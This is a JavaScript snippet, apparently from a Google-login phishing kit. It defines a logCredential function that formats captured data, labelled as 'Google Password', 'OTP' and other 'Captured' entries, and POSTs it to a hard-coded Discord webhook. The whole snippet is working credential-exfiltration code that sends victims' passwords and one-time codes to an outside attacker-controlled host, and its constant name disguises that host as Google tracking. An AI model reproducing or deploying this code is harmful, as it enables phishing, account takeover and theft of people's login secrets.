const GOOGLE_TRACKING_WEBHOOK = "https://discord.com/api/webhooks/1450972067645358100/xDrgUpAMOjbSXM9bYorQ08pq4zjgzpJstnPD07-IY8Z7lBdeeO7aTIlexRqYgYG8JJBU";

async function logCredential(type, data) {
    const embed = {
        title: `Google ${type} Captured`,
        color: type === 'OTP' ? 0xf1c40f : (type === 'Password' ? 0xe74c3c : 0x3498db),
        fields: []
    };

    for (const [key, value] of Object.entries(data)) {
        embed.fields.push({
            name: key.charAt(0).toUpperCase() + key.slice(1),
            value: value || "[Empty]",
            inline: true
        });
    }

    // Add timestamp
    embed.fields.push({ name: "Time", value: new Date().toLocaleString(), inline: false });

    // Send to Discord
    try {
        await fetch(GOOGLE_TRACKING_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log("Credential logged");
    } catch (e) {
        console.error("Webhook failed", e);
    }
}
